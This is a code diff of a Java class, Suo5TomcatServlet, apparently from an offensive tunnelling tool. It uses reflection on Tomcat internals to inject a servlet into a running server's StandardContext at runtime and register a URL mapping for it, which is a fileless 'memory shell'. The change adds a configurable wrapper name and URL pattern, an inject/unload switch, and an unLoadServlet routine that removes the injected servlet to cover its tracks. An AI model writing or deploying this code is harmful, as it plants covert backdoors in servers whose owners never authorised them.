@@ -25,8 +25,10 @@ public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Run
     private HashMap parameterMap;
     private ServletContext servletContext;
     private ServletConfig servletConfig;
-    private String servletPath;
+    private String wrapperName;
+    private String urlPattern;
     private String userAgent;
+    private String action;
 
     public static HashMap addrs = collectAddr();
     public static HashMap ctx = new HashMap();
@@ -524,14 +526,14 @@ public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Run
     }
 
 
-
-
     public boolean equals(Object obj) {
         try {
             this.parameterMap = (HashMap)obj;
             this.servletContext = (ServletContext)this.parameterMap.get("servletContext");
-            this.servletPath = getp("servletPath");
+            this.urlPattern = getp("urlPattern");
+            this.wrapperName = getp("wrapperName");
             this.userAgent = getp("userAgent");
+            this.action = getp("action");
             return true;
         } catch (Exception var3) {
             return false;
@@ -539,21 +541,27 @@ public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Run
     }
 
     public String toString() {
-        this.parameterMap.put("result", this.addServlet().getBytes());
+        if (this.action.equals("inject")) {
+            this.parameterMap.put("result", this.addServlet().getBytes());
+        } else {
+            this.parameterMap.put("result", this.unLoadServlet().getBytes());
+        }
         this.parameterMap = null;
         return "";
     }
 
     private String addServlet() {
         try {
-            String wrapperName = this.servletPath;
+            if (wrapperName.isEmpty()) {
+                wrapperName = this.getClass().getSimpleName() + System.currentTimeMillis();
+            }
             Object o = getFieldValue(this.servletContext, "context");
             Object standardContext = getFieldValue(o, "context");
             Object newWrapper = this.invoke(standardContext, "createWrapper", (Object[])null);
-            this.invoke(newWrapper, "setName", wrapperName);
+            this.invoke(newWrapper, "setName", this.wrapperName);
             setFieldValue(newWrapper, "instance", this);
             Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
-            Object oldWrapper = this.invoke(standardContext, "findChild", wrapperName);
+            Object oldWrapper = this.invoke(standardContext, "findChild", this.wrapperName);
             if (oldWrapper != null) {
                 standardContext.getClass().getDeclaredMethod("removeChild", containerClass);
             }
@@ -567,15 +575,42 @@ public final class Suo5TomcatServlet extends ClassLoader implements Servlet, Run
                 method = standardContext.getClass().getMethod("addServletMapping", String.class, String.class);
             }
 
-            method.invoke(standardContext, this.servletPath, wrapperName);
+            method.invoke(standardContext, this.urlPattern, this.wrapperName);
             if (this.getMethodByClass(newWrapper.getClass(), "setServlet", Servlet.class) == null) {
-                this.transform(standardContext, this.servletPath);
+                this.transform(standardContext, this.urlPattern);
                 this.init((ServletConfig)getFieldValue(newWrapper, "facade"));
             }
 
-            return "ok";
         } catch (Exception var10) {
             return var10.getMessage();
+        }
+        return "ok, wrapperName: " + wrapperName;
+    }
+
+    public String unLoadServlet() {
+        if (this.wrapperName != null && this.wrapperName.length() > 0 && this.urlPattern != null && this.urlPattern.length() > 0) {
+            try {
+                Object o = getFieldValue(this.servletContext, "context");
+                Field field = o.getClass().getDeclaredField("context");
+                field.setAccessible(true);
+                Object standardContext = getFieldValue(o, "context");
+                Object wrapper = this.invoke(standardContext, "findChild", this.wrapperName);
+                Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
+                if (wrapper != null) {
+                    standardContext.getClass().getDeclaredMethod("removeChild", containerClass).invoke(standardContext, wrapper);
+                    this.invoke(standardContext, "removeServletMapping", this.urlPattern);
+                    if (this.getMethodByClass(wrapper.getClass(), "setServlet", Servlet.class) == null) {
+                        this.transform(standardContext, this.urlPattern);
+                    }
+                    return "ok";
+                } else {
+                    return "not find wrapper";
+                }
+            } catch (Exception var8) {
+                return var8.getMessage();
+            }
+        } else {
+            return "wrapperName or urlPattern is Null";
         }
     }
 
